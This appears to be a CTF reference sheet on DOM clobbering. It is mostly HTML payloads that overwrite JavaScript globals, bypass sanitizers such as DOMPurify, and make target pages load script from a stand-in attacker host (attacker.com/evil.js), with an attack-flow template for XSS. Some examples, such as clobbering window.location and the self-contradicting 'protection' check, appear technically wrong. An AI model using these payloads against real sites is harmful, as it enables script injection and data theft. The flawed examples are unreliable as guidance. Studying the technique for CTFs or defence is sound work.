# DOM Clobbering

## Concept

Inject HTML with `id` or `name` attributes to overwrite global JavaScript variables or `document` properties — bypassing sanitizers that strip `<script>` but allow forms/anchors.

---

## Core Rules

| Attribute | Creates | Scope |
|-----------|---------|-------|
| `id="foo"` | `window.foo` | global |
| `name="foo"` | `document.foo` | document property |
| `id="foo"` (multiple) | `window.foo` = HTMLCollection | global, iterable |

---

## Basic Patterns

### id → global variable
```html
<form id=test></form>
<script>
  console.log(window.test)  // <form id=test>
  console.log(test)         // <form id=test>  — same thing
</script>
```

### name → document property
```html
<form name=test></form>
<script>
  console.log(document.test)  // <form name=test>
  // document.getElementById still works
</script>
```

### Override native document function
```html
<form name="getElementById"></form>
<script>
  document.getElementById("anything")  // TypeError: not a function
  // First script block crashes → second block still runs
</script>
<script>
  // Bypass: reaches here despite error above
  console.log("executed!")
</script>
```

---

## toString Problem & href Solution

By default, clobbered elements `toString()` as `[object HTMLFormElement]`, not a useful string.

**Fix: use `<a href=...>` for string value**

```html
<!-- toString gives the href value -->
<a id=config href="https://attacker.com/evil.js"></a>
<script>
  alert(config)    // "https://attacker.com/evil.js"
  // If app does: let src = config; import(src) → XSS
</script>
```

---

## HTMLCollection — Two-Level Clobbering

When multiple elements share the same `id`, `window.id` becomes an HTMLCollection. Named children become properties.

```html
<a id=config></a>
<a id=config name=url href="https://attacker.com/evil.js"></a>
<script>
  alert(config.url)   // "https://attacker.com/evil.js"
</script>
```

**CTF exploit template: clobber `obj.property`**
```html
<!-- Target code: let url = config.cdnUrl; fetch(url) -->
<a id=config></a>
<a id=config name=cdnUrl href="//attacker.com/xss.js"></a>
```

---

## DOMPurify Bypass Patterns

DOMPurify (< 2.0.17) allowed clobbering of `document.getElementById`:

```html
<form id=x><output id=attributes></output></form>
```

Modern DOMPurify bypass (depends on version — test with canary):
```html
<form name="createNodeIterator"><input id=filter></form>
```

---

## Clobbering `window.location`

```html
<!-- Force window.location.href to attacker value -->
<a id=location href="javascript:alert(1)"></a>
<!-- If app does: if (location.href.includes('safe')) { doSomething() } -->
```

---

## Clobbering Checks

```html
<!-- Bypass: if (window.isDebug) { skip_auth() } -->
<img id=isDebug src=x>  <!-- truthy: HTMLElement object -->

<!-- Bypass: if (!window.protection) { allow() } -->
<!-- nothing needed — undefined is falsy, and clobbering with any element makes it truthy -->
<form id=protection></form>
```

---

## Nested Clobbering (3+ levels via iframe)

```html
<!-- clobber window.a.b.c -->
<iframe name=a srcdoc="
  <iframe name=b srcdoc='
    <a id=c href=javascript:alert(1)></a>
  '></iframe>
"></iframe>
<script>
  setTimeout(() => alert(a.b.c), 500)
</script>
```

---

## Quick Detection

Inject these in any HTML sink that survives sanitization:

```html
<!-- Level 1 test -->
<img id=testclobber src=x onerror=console.log(window.testclobber)>

<!-- Level 2 test -->
<form id=cfg><input name=key value=CLOBBERED></form>
<!-- Then check: cfg.key.value or cfg.key -->
```

---

## Attack Flow (CTF)

```
1. Find HTML injection that survives sanitizer (no <script> but allows <form>/<a>/<img>)
2. Find JS code reading a global variable: window.X, config.Y, document.Z
3. Craft HTMLCollection chain to inject controlled string (use <a href=...>)
4. Trigger the vulnerable JS path → XSS / open redirect / SSRF
```

---

## Real CTF Examples

- **Google CTF 2019 Qual - pastetastic**: DOM clobbering `document.getElementById` override
- **VolgaCTF 2020 Qualifier - Archive**: HTMLCollection two-level clobbering → XSS
- **UIUCTF 2021 - yana**: clobber `window.config` to bypass CSP nonce check

---

## References

- [PortSwigger DOM clobbering](https://portswigger.net/web-security/dom-based/dom-clobbering)
- [Mitigating DOM Clobbering Attacks — Securitum](https://research.securitum.com/dom-clobbering-the-exploitation-of-an-old-technique-and-its-impact-on-web-application-security/)
